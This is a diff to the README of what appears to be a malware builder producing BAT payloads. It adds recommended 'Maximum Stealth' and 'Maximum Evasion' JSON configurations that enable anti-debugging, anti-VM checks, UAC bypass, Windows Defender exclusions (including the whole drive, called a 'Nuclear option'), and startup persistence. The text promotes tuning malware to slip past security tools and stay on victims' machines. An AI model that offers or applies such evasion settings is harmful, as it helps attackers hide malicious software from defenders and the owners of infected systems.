@@ -297,7 +297,7 @@ Comprehensive documentation is available in the `docs/` directory:
 
 ### Configuration Recommendations
 
-**For Maximum Stealth**:
+**For Maximum Stealth** (Recommended):
 ```json
 {
     "file_extension": "BAT",
@@ -305,6 +305,21 @@ Comprehensive documentation is available in the `docs/` directory:
     "anti_virtual_machine": true,
     "uac_bypass": true,
     "defender_exclusion": true,
+    "defender_exclude_drive": false,
+    "single_instance": true,
+    "run_on_startup": true
+}
+```
+
+**For Maximum Evasion** (?? Testing Only):
+```json
+{
+    "file_extension": "BAT",
+    "anti_debug": true,
+    "anti_virtual_machine": true,
+    "uac_bypass": true,
+    "defender_exclusion": true,
+    "defender_exclude_drive": true,  // Nuclear option!
     "single_instance": true,
     "run_on_startup": true
 }
